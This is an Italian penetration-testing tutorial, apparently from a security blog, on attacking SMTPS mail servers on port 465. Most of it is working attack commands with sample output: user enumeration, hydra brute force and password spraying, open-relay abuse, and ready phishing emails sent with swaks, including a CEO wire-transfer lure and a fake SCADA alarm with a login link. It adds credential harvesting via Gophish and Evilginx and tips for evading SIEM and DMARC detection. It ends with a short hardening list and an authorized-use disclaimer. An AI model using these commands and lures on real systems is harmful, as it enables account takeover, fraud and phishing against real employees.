---
title: >-
  Porta 465 SMTPS: cos’è, come funziona e rischi di sicurezza del mail
  submission TLS.
slug: porta-465-smtps
description: >-
  Scopri a cosa serve la porta 465 SMTPS, come funziona SMTP Submission over
  TLS, quali rischi introduce tra user enumeration, open relay, brute force SMTP
  AUTH e phishing interno con credenziali valide.
image: /porta-465-smtps.webp
draft: false
date: 2026-04-05T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - smtps
  - smtp-auth
---

> **Executive Summary** — La porta 465 SMTPS espone SMTP over SSL, il protocollo per l'invio di email con cifratura TLS nativa. A differenza della porta 25 (SMTP cleartext) e 587 (submission con StartTLS), la 465 stabilisce il tunnel TLS prima di qualsiasi scambio SMTP. In un pentest, questa porta rivela la configurazione del mail server, consente enumerazione utenti, test di open relay e — con credenziali valide — l'invio di email di phishing interne indistinguibili da quelle legittime. Questo articolo copre dall'analisi del certificato al relay abuse, dallo user enumeration al credential spraying SMTP.

## TL;DR — 3 punti chiave

* La porta 465 SMTPS espone il **certificato TLS** che rivela hostname del mail server, dominio e CA interna.
* I comandi `VRFY` e `EXPN` abilitati permettono **enumerazione diretta degli utenti email** senza autenticazione.
* Con credenziali SMTP valide puoi inviare **phishing interno** che bypassa i filtri anti-spam esterni.

Porta 465 SMTPS trasporta email cifrate dal client al mail server usando TLS nativo. Quando trovi questa porta aperta, stai guardando il sistema di posta dell'organizzazione target. La vulnerabilità della porta 465 va oltre i bug tecnici: un mail server mal configurato è un'arma per il pentester. L'enumerazione porta 465 rivela utenti email validi, configurazione del server, policy di autenticazione e possibilità di relay. Nel pentest SMTPS è il vettore per phishing mirato — email inviate dal server interno del target, con header legittimi, SPF valido e nessun flag anti-spam. Nella kill chain occupa la posizione di initial access (phishing) e persistence (account email compromesso per C2 o data exfiltration).

## 1. Anatomia Tecnica della Porta 465

La porta 465 è registrata IANA come `smtps` (submissions) su protocollo TCP. Il protocollo è SMTP standard avvolto in TLS nativo — il tunnel cifrato si stabilisce prima di qualsiasi comando SMTP.

Il flusso di una connessione SMTPS:

1. **TCP handshake** sulla porta 465
2. **TLS handshake**: negoziazione cipher e scambio certificato (prima di SMTP)
3. **SMTP banner**: il server si presenta con hostname e software
4. **EHLO**: il client si identifica, il server elenca le capability (AUTH, SIZE, VRFY, ecc.)
5. **AUTH**: autenticazione (PLAIN, LOGIN, CRAM-MD5, XOAUTH2)
6. **MAIL FROM / RCPT TO / DATA**: composizione e invio email

Le varianti operative sono SMTPS nativo (porta 465, TLS immediato), SMTP + StartTLS (porta 587, upgrade TLS dopo EHLO), SMTP cleartext (porta 25, nessuna cifratura).

```
Misconfig: Open relay — il server accetta email per qualsiasi dominio senza autenticazione
Impatto: l'attacker invia email spoofate usando il server legittimo del target, bypassando SPF
Come si verifica: openssl s_client -connect [target]:465 poi MAIL FROM:<test@evil.com> e RCPT TO:<victim@external.com>
```

```
Misconfig: VRFY/EXPN abilitati — enumerazione utenti diretta
Impatto: conferma quali indirizzi email esistono senza autenticazione
Come si verifica: dopo connessione TLS, inviare VRFY admin e osservare la risposta (250 = esiste, 550 = non esiste)
```

```
Misconfig: AUTH PLAIN su TLS con password deboli
Impatto: credenziali email brute-forceable — una volta ottenute, accesso completo alla casella
Come si verifica: hydra -l user@domain.com -P wordlist.txt smtps://[target]:465
```

## 2. Enumerazione Base

L'enumerazione della porta 465 SMTPS parte dalla connessione TLS e dall'analisi del banner e delle capability SMTP. Questi dati ti dicono cosa puoi fare senza autenticazione.

### Comando 1: Nmap

```bash
nmap -sV -sC -p 465 --script ssl-cert,smtp-commands 10.10.10.25
```

**Output atteso:**

```
PORT    STATE SERVICE  VERSION
465/tcp open  ssl/smtp Postfix smtpd
| ssl-cert:
|   Subject: commonName=mail.corp.local
|   Subject Alternative Name: DNS:mail.corp.local, DNS:smtp.corp.local
|   Issuer: commonName=Corp-CA
|_  Not valid after: 2027-03-01
| smtp-commands:
|   mail.corp.local Hello,
|   SIZE 52428800,
|   AUTH PLAIN LOGIN CRAM-MD5,
|   ENHANCEDSTATUSCODES,
|   8BITMIME,
|   VRFY,
|_  HELP
```

**Parametri:**

* `-sV`: identifica il mail server (Postfix, Exchange, Sendmail, Exim)
* `--script ssl-cert`: estrae il certificato TLS con hostname e SAN
* `--script smtp-commands`: enumera i comandi SMTP supportati (AUTH, VRFY, EXPN)

### Comando 2: openssl per connessione manuale

```bash
openssl s_client -connect 10.10.10.25:465 -quiet
```

Dopo la connessione TLS, interagisci direttamente con SMTP:

```
220 mail.corp.local ESMTP Postfix
EHLO test
```

**Output atteso:**

```
250-mail.corp.local
250-PIPELINING
250-SIZE 52428800
250-VRFY
250-ETRN
250-AUTH PLAIN LOGIN CRAM-MD5
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
```

**Cosa ci dice questo output:** Postfix come MTA, dimensione massima 50MB, VRFY abilitato (puoi verificare utenti), autenticazione PLAIN/LOGIN/CRAM-MD5 supportata. L'hostname `mail.corp.local` conferma il dominio interno. PIPELINING indica che puoi inviare più comandi senza attendere risposta — utile per enumerazione veloce.

## 3. Enumerazione Avanzata

### User enumeration via VRFY

Il comando VRFY conferma l'esistenza di un indirizzo email. Per costruire una wordlist efficace, consulta la [guida alla generazione di username](https://hackita.it/articoli/enumeration).

```bash
for user in admin administrator root postmaster helpdesk hr it finance ceo cfo; do
  echo "VRFY $user" | openssl s_client -connect 10.10.10.25:465 -quiet 2>/dev/null | grep -E "^2[0-9]{2}|^5[0-9]{2}"
done
```

**Output:**

```
252 2.0.0 admin
550 5.1.1 <administrator>: Recipient address rejected: User unknown
252 2.0.0 root
252 2.0.0 postmaster
550 5.1.1 <helpdesk>: Recipient address rejected: User unknown
252 2.0.0 hr
252 2.0.0 it
550 5.1.1 <finance>: Recipient address rejected: User unknown
550 5.1.1 <ceo>: Recipient address rejected: User unknown
550 5.1.1 <cfo>: Recipient address rejected: User unknown
```

**Lettura dell'output:** codice 252 = utente esiste (o il server non conferma/nega esplicitamente). Codice 550 = utente non esiste. Gli utenti `admin`, `root`, `postmaster`, `hr`, `it` sono confermati. Questi diventano target per brute force SMTP e per la [costruzione di email di phishing mirate](https://hackita.it/articoli/phishing).

### User enumeration via RCPT TO (alternativa)

Se VRFY è disabilitato, puoi usare RCPT TO per verificare gli utenti:

```bash
openssl s_client -connect 10.10.10.25:465 -quiet << 'EOF'
EHLO test.local
MAIL FROM:<test@test.local>
RCPT TO:<admin@corp.local>
RCPT TO:<nonexistent@corp.local>
QUIT
EOF
```

**Output:**

```
250 2.1.0 Ok
250 2.1.5 Ok
550 5.1.1 <nonexistent@corp.local>: Recipient address rejected
221 2.0.0 Bye
```

**Lettura dell'output:** il primo RCPT TO restituisce 250 (utente valido), il secondo 550 (non esiste). Questa tecnica funziona anche quando VRFY è disabilitato. Tuttavia, alcuni server accettano tutti i RCPT TO e rifiutano dopo (catch-all) — verifica con indirizzi chiaramente invalidi.

### Script NSE per enumerazione SMTP

```bash
nmap -p 465 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,RCPT,EXPN} 10.10.10.25
```

**Output:**

```
| smtp-enum-users:
|   root
|   admin
|   postmaster
|   hr
|_  it
```

**Lettura dell'output:** nmap ha confermato 5 utenti validi usando i metodi VRFY ed RCPT TO. `EXPN` non è supportato dal server (Postfix di default lo disabilita).

### Analisi certificato per intelligence

```bash
openssl s_client -connect 10.10.10.25:465 2>/dev/null | openssl x509 -noout -text | grep -E "Subject:|DNS:|Issuer:|emailAddress"
```

**Output:**

```
        Issuer: CN = Corp-CA, O = Corp Inc, emailAddress = ca-admin@corp.local
        Subject: CN = mail.corp.local
            DNS:mail.corp.local, DNS:smtp.corp.local, DNS:exchange.corp.local
```

**Lettura dell'output:** tre hostname nel SAN — `exchange.corp.local` suggerisce che il server potrebbe avere anche Exchange/OWA. L'email della CA (`ca-admin@corp.local`) è un altro username valido. Approfondisci l'analisi dei certificati nella [guida HTTPS porta 443](https://hackita.it/articoli/https).

## 4. Tecniche Offensive

**Credential brute force SMTP AUTH**

Contesto: server SMTP con AUTH PLAIN/LOGIN abilitato su TLS. Nessun rate limiting o account lockout sulle mailbox.

```bash
hydra -l admin@corp.local -P /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt smtps://10.10.10.25:465
```

**Output (successo):**

```
[465][smtp] host: 10.10.10.25   login: admin@corp.local   password: Password1
1 of 1 target successfully completed, 1 valid password found
```

**Output (fallimento):**

```
[465][smtp] host: 10.10.10.25
1 of 1 target completed, 0 valid passwords found
```

**Cosa fai dopo:** con credenziali SMTP valide puoi inviare email dal server legittimo. Configura un client email (mutt, swaks) per inviare phishing interno. Le email inviate dall'MTA interno passano SPF, DKIM (se configurato) e non vengono flaggate come spam.

**Open relay test**

Contesto: server SMTP che accetta email per domini esterni senza autenticazione.

```bash
swaks --to victim@external.com --from admin@corp.local --server 10.10.10.25 --port 465 --tls --header "Subject: Test relay" --body "Test open relay"
```

**Output (successo):**

```
=== Trying 10.10.10.25:465...
=== Connected to 10.10.10.25.
<~~ 220 mail.corp.local ESMTP Postfix
 ~~> EHLO test.local
<~~ 250-mail.corp.local
 ~~> MAIL FROM:<admin@corp.local>
<~~ 250 2.1.0 Ok
 ~~> RCPT TO:<victim@external.com>
<~~ 250 2.1.5 Ok
 ~~> DATA
<~~ 354 End data with <CR><LF>.<CR><LF>
 ~~> [message body]
<~~ 250 2.0.0 Ok: queued as ABC123
```

**Output (fallimento):**

```
 ~~> RCPT TO:<victim@external.com>
<~~ 554 5.7.1 <victim@external.com>: Relay access denied
```

**Cosa fai dopo:** open relay confermato. Puoi inviare email spoofate dal dominio corp.local a qualsiasi destinatario esterno. Questo bypassa SPF perché l'email parte dal server MX legittimo. È un finding critico per il report e un vettore potente per [campagne di phishing](https://hackita.it/articoli/phishing).

**Internal phishing con credenziali SMTP**

Contesto: credenziali SMTP valide ottenute da brute force, file di configurazione o credential dump.

```bash
swaks --to ceo@corp.local --from it-support@corp.local --server 10.10.10.25 --port 465 --tls --auth-user admin@corp.local --auth-password Password1 --header "Subject: Aggiornamento sicurezza obbligatorio" --header "Content-Type: text/html" --body '<html><body><p>È richiesto un aggiornamento immediato del tuo account.<br><a href="https://10.10.10.100/update">Clicca qui per aggiornare</a></p></body></html>'
```

**Output (successo):**

```
=== Connected to 10.10.10.25.
 ~~> AUTH LOGIN
<~~ 334 VXNlcm5hbWU6
 ~~> [base64 username]
<~~ 334 UGFzc3dvcmQ6
 ~~> [base64 password]
<~~ 235 2.7.0 Authentication successful
 ~~> MAIL FROM:<it-support@corp.local>
<~~ 250 2.1.0 Ok
 ~~> RCPT TO:<ceo@corp.local>
<~~ 250 2.1.5 Ok
<~~ 250 2.0.0 Ok: queued as DEF456
```

**Output (fallimento):**

```
<~~ 535 5.7.8 Error: authentication failed
```

**Cosa fai dopo:** l'email è stata inviata dal server mail interno, con header legittimi. Il link punta al tuo server per catturare credenziali (Gophish, Evilginx). Monitora le connessioni in ingresso sul tuo listener.

**SMTP password spraying**

Contesto: lista di utenti email ottenuta da VRFY o LDAP. Testi una password comune su tutti gli account.

```bash
hydra -L email_users.txt -p 'Corp2026!' smtps://10.10.10.25:465 -t 2 -W 5
```

**Output (successo):**

```
[465][smtp] host: 10.10.10.25   login: hr@corp.local   password: Corp2026!
[465][smtp] host: 10.10.10.25   login: it@corp.local   password: Corp2026!
```

**Output (fallimento):**

```
0 valid passwords found
```

**Cosa fai dopo:** due account compromessi. Verifica se le stesse credenziali funzionano su OWA, VPN o Active Directory. Account email con password deboli spesso riusano la password su tutti i servizi. Approfondisci nella [guida al credential reuse](https://hackita.it/articoli/bruteforce).

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise con Exchange/Postfix esposto

**Situazione:** azienda con mail server esposto su Internet (porta 465). Nessuna credenziale iniziale. Obiettivo: ottenere accesso alla posta interna.

**Step 1:**

```bash
nmap -sV -p 465 --script smtp-commands,ssl-cert mail.corp.com
```

**Output atteso:**

```
465/tcp open  ssl/smtp  Postfix smtpd
| smtp-commands: VRFY, AUTH PLAIN LOGIN
| ssl-cert: Subject: CN=mail.corp.com
```

**Step 2:**

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.25 -p 465
```

**Output atteso:**

```
10.10.10.25: admin exists
10.10.10.25: info exists
10.10.10.25: support exists
```

**Se fallisce:**

* Causa probabile: VRFY disabilitato
* Fix: usa RCPT TO method: `smtp-user-enum -M RCPT -D corp.local -U names.txt -t 10.10.10.25 -p 465`

**Tempo stimato:** 15-30 minuti

### Scenario 2: Lab con open relay

**Situazione:** mail server in lab con configurazione di default. Relay non restrittivo.

**Step 1:**

```bash
nmap -p 465 --script smtp-open-relay 10.10.10.25
```

**Output atteso:**

```
| smtp-open-relay:
|   Server is an open relay (1/16 tests)
|_  MAIL FROM:<test@test.com> -> RCPT TO:<test@external.com>
```

**Step 2:**

```bash
swaks --to target@external.com --from ceo@corp.local --server 10.10.10.25 --port 465 --tls --header "Subject: Urgent - wire transfer" --body "Please process immediately"
```

**Output atteso:**

```
<~~ 250 2.0.0 Ok: queued
```

**Se fallisce:**

* Causa probabile: il server accetta solo relay per domini specifici
* Fix: testa con dominio del target: `--to user@corp.local` per verificare almeno il relay interno

**Tempo stimato:** 5-10 minuti

### Scenario 3: OT/ICS con mail server per allarmi

**Situazione:** rete industriale con mail server dedicato per notifiche SCADA/PLC. SMTP usato da device OT per inviare allarmi. Poca o nessuna autenticazione.

**Step 1:**

```bash
nmap -sV -p 25,465,587 192.168.1.0/24 --open
```

**Output atteso:**

```
192.168.1.100 - 465/tcp open ssl/smtp hMailServer 5.6.8
```

**Step 2:**

```bash
openssl s_client -connect 192.168.1.100:465 -quiet << 'EOF'
EHLO test
MAIL FROM:<plc-alarm@ot.local>
RCPT TO:<operator@corp.local>
DATA
Subject: ALARM: Tank Level Critical
Tank #3 level at 98%. Immediate action required.
Check dashboard: http://192.168.1.200/login
.
QUIT
EOF
```

**Output atteso:**

```
250 2.0.0 Ok: queued
```

**Se fallisce:**

* Causa probabile: hMailServer richiede autenticazione anche per invio locale
* Fix: cerca credenziali di default hMailServer: `admin` / `(vuoto)` o nel file `hMailServer.INI`

**Tempo stimato:** 10-15 minuti

## 6. Attack Chain Completa

```
Recon (scan 465, cert, banner) → User Enum (VRFY/RCPT TO) → Credential Spray → Internal Phishing → Credential Harvest (Gophish/Evilginx) → Mailbox Access → Data Exfiltration / Lateral Movement
```

| Fase               | Tool             | Comando chiave                                           | Output/Risultato              |
| ------------------ | ---------------- | -------------------------------------------------------- | ----------------------------- |
| Recon              | nmap/openssl     | `nmap -sV -p 465 --script smtp-commands,ssl-cert`        | MTA, versione, capability     |
| User Enum          | smtp-user-enum   | `smtp-user-enum -M VRFY -t [target] -p 465`              | Lista email valide            |
| Credential Spray   | hydra            | `hydra -L users.txt -p 'Pass1' smtps://[target]:465`     | Account compromessi           |
| Phishing           | swaks            | `swaks --to [victim] --from [spoofed] --server [target]` | Email di phishing inviata     |
| Credential Harvest | Gophish          | Landing page su `https://[tuo_IP]/login`                 | Username e password catturate |
| Mailbox Access     | thunderbird/mutt | IMAP/POP3 con credenziali ottenute                       | Accesso email completo        |

**Timeline stimata:** 30-120 minuti per enum + spray. Il phishing richiede tempo per le risposte delle vittime (ore/giorni).

**Ruolo della porta 465:** è il canale per trasformare un'enumerazione in accesso. Le email inviate dal server MTA interno hanno legittimità intrinseca — SPF valido, header coerenti, nessun flag spam. È il vettore di phishing più efficace possibile.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Mail server log**: `/var/log/mail.log` (Postfix), Event Viewer → Application (Exchange) — tentativi AUTH falliti, VRFY multipli
* **SIEM**: alert su auth failure massivi sulla porta 465 da singolo IP
* **Anti-spam**: volume anomalo di email inviate da un singolo account autenticato
* **SPF/DKIM/DMARC**: report aggregati che mostrano invii da IP non autorizzati

### Tecniche di Evasion

```
Tecnica: Rate limiting nel brute force
Come: hydra -t 1 -W 10 — 1 thread, 10 secondi di attesa. Oppure distribuisci su più IP sorgente
Riduzione rumore: evita trigger su "10+ auth failure in 1 minuto" tipico dei SIEM
```

```
Tecnica: Phishing con account legittimo
Come: usa credenziali SMTP valide (ottenute da spray) per inviare email. Non serve relay
Riduzione rumore: l'email passa SPF, DKIM e DMARC. Non genera alert anti-spam
```

```
Tecnica: Invio email a orari lavorativi
Come: programma l'invio di phishing tra le 9:00 e le 11:00 del mattino (picco di attività email)
Riduzione rumore: il traffico SMTP è normale in quelle fasce orarie, meno scrutinato
```

### Cleanup Post-Exploitation

* Se hai inviato email di phishing: non puoi ritirarle, ma documenta tutto per il report
* Se hai creato regole di forward sulla mailbox: rimuovile
* Log del mail server contengono ogni tentativo VRFY, AUTH e invio con IP sorgente
* Cambia le password degli account compromessi nel report finale

## 8. Toolchain e Confronto

### Pipeline operativa

```
nmap/openssl (fingerprint) → smtp-user-enum (user enum) → hydra (credential spray) → swaks (phishing) → Gophish/Evilginx (credential harvest) → thunderbird (mailbox access)
```

Dati che passano tra fasi: hostname mail server, utenti email validi, credenziali SMTP, email inviate, credenziali raccolte da phishing.

### Tabella comparativa

| Aspetto                 | SMTPS (465/TCP)              | SMTP+StartTLS (587/TCP)      | SMTP (25/TCP)               |
| ----------------------- | ---------------------------- | ---------------------------- | --------------------------- |
| Porta default           | 465                          | 587                          | 25                          |
| Cifratura               | TLS nativo (immediato)       | StartTLS (upgrade)           | Nessuna                     |
| Uso primario            | Client → Server (invio)      | Client → Server (submission) | Server → Server (relay)     |
| Auth tipica             | PLAIN/LOGIN su TLS           | PLAIN/LOGIN su TLS           | Nessuna (relay)             |
| User enum               | VRFY/RCPT TO su TLS          | VRFY/RCPT TO su TLS          | VRFY/RCPT TO cleartext      |
| Rischio intercettazione | Basso (TLS nativo)           | Medio (downgrade possibile)  | Alto (cleartext)            |
| Quando preferirlo       | Test invio email autenticato | Test submission              | Test relay server-to-server |

## 9. Troubleshooting

| Errore / Sintomo                                     | Causa                                                    | Fix                                                                             |
| ---------------------------------------------------- | -------------------------------------------------------- | ------------------------------------------------------------------------------- |
| `Connection refused` su porta 465                    | SMTPS non abilitato, il server usa solo 587 con StartTLS | Scan `nmap -p 25,465,587 [target]` per trovare la porta attiva                  |
| `SSL routines: wrong version number`                 | La porta non è TLS nativo (forse StartTLS su 587)        | Usa `openssl s_client -connect [target]:587 -starttls smtp` per la 587          |
| VRFY restituisce sempre 252                          | Il server non conferma né nega (config conservativa)     | Passa a RCPT TO method che dà risposte più definitive (250 vs 550)              |
| `535 Authentication failed` con credenziali corrette | Il server richiede CRAM-MD5, non PLAIN                   | Specifica metodo: `swaks --auth CRAM-MD5 --auth-user user --auth-password pass` |
| hydra molto lento su SMTPS                           | Overhead TLS per ogni tentativo                          | Riduci wordlist. Usa `-t 4` max per SMTPS. Considera `medusa` come alternativa  |
| Email inviata ma non ricevuta                        | Filtro anti-spam/content filter blocca il messaggio      | Verifica log del server: `grep "queued\|reject\|discard" /var/log/mail.log`     |

## 10. FAQ

**D: Qual è la differenza tra porta 465 SMTPS e porta 587 con StartTLS?**

R: La porta 465 stabilisce TLS immediatamente (prima di SMTP). La porta 587 inizia in chiaro e fa upgrade a TLS con il comando STARTTLS. La 465 è stata deprecata e poi riassegnata (RFC 8314 la raccomanda di nuovo nel 2018). In pratica, entrambe supportano invio autenticato; la 465 è più sicura perché non ha la finestra di cleartext iniziale.

**D: Come verificare se il server SMTP sulla porta 465 è un open relay?**

R: Connettiti con `openssl s_client -connect [target]:465`, poi invia `MAIL FROM:<test@evil.com>` e `RCPT TO:<test@gmail.com>`. Se entrambi restituiscono 250 senza richiedere AUTH, il server è un open relay. Nmap ha anche lo script `smtp-open-relay` per automatizzare il test.

**D: Come fare user enumeration su SMTPS porta 465?**

R: Tre metodi: VRFY (invia `VRFY user`, 252=esiste), RCPT TO (invia `RCPT TO:<user@domain>` dopo `MAIL FROM`, 250=esiste), EXPN (espande mailing list). VRFY è il più diretto ma spesso disabilitato. RCPT TO funziona quasi sempre. Usa `smtp-user-enum` per automatizzare.

**D: Posso usare porta 465 per phishing interno in un pentest?**

R: Sì, con credenziali SMTP valide puoi inviare email dal server MTA interno. Le email avranno header legittimi, passeranno SPF/DKIM e non saranno flaggate come spam esterno. Documenta tutto nel report e assicurati che il phishing sia nel scope dell'engagement.

**D: Quali tool servono per testare la porta 465 SMTPS?**

R: Kit base: `openssl s_client` (connessione manuale), `nmap` con script `smtp-commands` e `smtp-enum-users`, `swaks` (invio email test), `hydra` (brute force SMTP AUTH), `smtp-user-enum` (enumerazione utenti). Per phishing campaigns: `Gophish` per gestione completa.

## 11. Cheat Sheet Finale

| Azione              | Comando                                                                                                     | Note                       |
| ------------------- | ----------------------------------------------------------------------------------------------------------- | -------------------------- |
| Scan SMTPS          | `nmap -sV -p 465 --script smtp-commands,ssl-cert [target]`                                                  | Banner + cert + capability |
| Connessione manuale | `openssl s_client -connect [target]:465 -quiet`                                                             | Poi comandi SMTP           |
| EHLO + capability   | `EHLO test.local`                                                                                           | Dopo connessione TLS       |
| User enum VRFY      | `VRFY admin`                                                                                                | 252=esiste, 550=non esiste |
| User enum RCPT      | `MAIL FROM:<t@t.com>` poi `RCPT TO:<user@domain>`                                                           | 250=esiste                 |
| Open relay test     | `swaks --to ext@gmail.com --from user@domain --server [target] --port 465 --tls`                            | 250 queued = relay         |
| Brute force         | `hydra -l user@domain -P wordlist.txt smtps://[target]:465`                                                 | Usa -t 2 per SMTPS         |
| Invio phishing      | `swaks --to victim --from spoofed --server [target] --port 465 --tls --auth-user user --auth-password pass` | Con creds valide           |
| Enum automatica     | `smtp-user-enum -M VRFY -U users.txt -t [target] -p 465`                                                    | Bulk enumeration           |
| Analisi cert        | `openssl s_client -connect [target]:465 \| openssl x509 -noout -text`                                       | SAN, issuer, scadenza      |

### Perché Porta 465 è rilevante nel 2026

RFC 8314 (2018) ha riabilitato ufficialmente la porta 465 per "implicit TLS" come metodo raccomandato per la submission email. La migrazione da 587+StartTLS a 465+implicit TLS è in corso. Molti mail server espongono entrambe le porte. Nel pentest, la 465 è preferibile perché elimina il rischio di downgrade attack presente con StartTLS. Verifica la presenza con `nmap -p 465,587,25 [target] --open` in ogni engagement che coinvolge il sistema di posta.

### Hardening e Mitigazione

* Disabilita VRFY e EXPN: in Postfix `disable_vrfy_command = yes` in `main.cf`
* Configura rate limiting su AUTH: `smtpd_client_auth_rate_limit = 5` (Postfix)
* Imposta relay restrictions: `smtpd_relay_restrictions = permit_sasl_authenticated, reject_unauth_destination`
* Abilita SPF, DKIM e DMARC con policy `reject` per prevenire spoofing

### OPSEC per il Red Team

I tentativi VRFY e AUTH generano log immediati nel mail server (path: `/var/log/mail.log` su Linux). Un burst di VRFY da singolo IP è un pattern riconoscibile. Per ridurre visibilità: distanzia le query VRFY di 3-5 secondi, limita il brute force a 1-2 tentativi per account, invia phishing da account legittimi (non spoofati) per evitare alert DMARC, e programma l'invio in orario lavorativo. Il traffico è cifrato (TLS) quindi il contenuto non è visibile a IDS, ma i metadati (IP sorgente, frequenza connessioni) lo sono.

***

Tutti i comandi e le tecniche descritti in questo articolo sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto firmato, laboratori personali, piattaforme CTF. Riferimento tecnico: RFC 8314 (Cleartext Considered Obsolete), RFC 5321 (SMTP), RFC 4954 (SMTP AUTH).

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
